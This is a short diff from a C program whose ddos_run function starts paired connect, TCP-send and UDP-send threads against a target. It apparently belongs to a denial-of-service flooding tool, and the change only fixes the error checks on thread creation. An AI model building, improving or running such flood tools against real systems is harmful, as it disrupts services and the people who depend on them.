@@ -164,14 +164,14 @@ static void _udpsend(struct targ * targ) {
 void
 ddos_run(struct targ * arg) {
     // 创建两个 connect 线程
-    CERR_IF(async_run(_connect, arg));
-    CERR_IF(async_run(_connect, arg));
+    CERR_IF(async_run(_connect, arg) < 0);
+    CERR_IF(async_run(_connect, arg) < 0);
 
     // 创建两个 connect + send 线程
-    CERR_IF(async_run(_tcpsend, arg));
-    CERR_IF(async_run(_tcpsend, arg));
+    CERR_IF(async_run(_tcpsend, arg) < 0);
+    CERR_IF(async_run(_tcpsend, arg) < 0);
 
     // 创建两个 udp send 线程
-    CERR_IF(async_run(_udpsend, arg));
-    CERR_IF(async_run(_udpsend, arg));
+    CERR_IF(async_run(_udpsend, arg) < 0);
+    CERR_IF(async_run(_udpsend, arg) < 0);
 }
